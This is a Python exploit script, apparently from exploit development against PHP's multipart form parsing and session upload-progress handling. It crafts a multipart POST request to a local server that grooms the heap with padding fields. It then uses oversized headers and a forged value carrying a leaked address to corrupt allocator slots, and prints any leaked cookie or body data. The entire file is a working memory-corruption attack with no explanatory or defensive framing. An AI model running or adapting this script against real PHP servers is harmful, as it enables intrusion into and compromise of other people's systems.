#!/usr/bin/env python3
"""B: Npre pre-fill fields (8-char names, 475-byte values -> 512B bin) to
consume low free pages; then forge part (2 headers with 31-char names + 7B
values => 4x32B slots; 31B forge value raw => slot4 = id 0x6e080); then
PHPSESSID/progress parts.
usage: b_forge32_pad.py Npre LEAK [MARK]
"""
import socket,sys,struct
Npre=int(sys.argv[1]); LEAK=int(sys.argv[2],0); MARK=sys.argv[3] if len(sys.argv)>3 else 'M'
BND=b'B'*10
o=bytearray()
def part(headers,data):
    global o
    o+=b'--'+BND+b'\r\n'+headers+b'\r\n\r\n'+data+b'\r\n'
for i in range(Npre):
    nm=('f%07d'%i).encode()
    part(b'Content-Disposition: form-data; name="'+nm+b'"', b'P'*475)
v=bytearray(b'A'*31); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x18+len(MARK)]=MARK.encode()
h=b''
for i in range(2):
    name=('X%029d'%i).encode()[:31]
    h += name+b': '+b'q'*7+b'\r\n'
h += b'Content-Disposition: form-data; name="forge"'
part(h, bytes(v))
part(b'Content-Disposition: form-data; name="PHPSESSID"', b'attacksessionid0001')
part(b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b'pwn')
o+=b'--'+BND+b'--\r\n'
req=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<400000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:120].decode('latin1','replace'))
print('BODY',rest[:90].decode('latin1','replace'))
open('/tmp/b_forge32_pad.resp','wb').write(data)
